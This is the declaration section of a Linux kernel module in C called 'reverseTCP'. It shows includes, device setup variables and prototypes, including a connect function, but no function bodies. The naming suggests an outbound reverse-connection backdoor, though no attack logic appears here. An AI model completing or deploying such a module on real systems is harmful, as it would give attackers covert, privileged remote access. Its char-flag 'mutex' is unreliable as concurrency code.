#include <linux/init.h>           
#include <linux/module.h> 
#include <linux/kmod.h>        
#include <linux/device.h>         
#include <linux/kernel.h>         
#include <linux/fs.h> 
#include <linux/string.h>
#include <asm/uaccess.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include "reverseTCP_ioctl.h"

#define DEVICE_NAME "reverseTCP"    
#define CLASS_NAME  "Testchar" 

static int    num_of_dev_open = -1;//start number of devises at -1 so first dev gets count 0
static char   reverseTCP_mutex = 0;//mutex var, concurrency management; 
static int    major_number = 0;//<device number -- initialized to place it on the .data section and not on .bss
static struct class*  reverseTCP_class  = NULL;//< class struct pointer
static struct device* reverseTCP_device = NULL;//< device struct pointer

static int     reverseTCP_open(struct inode *, struct file *);
static int     reverseTCP_connect(void);
static int     reverseTCP_release(struct inode *, struct file *);
static long    reverseTCP_ioctl (struct file *filp, unsigned int cmd, unsigned long arg);
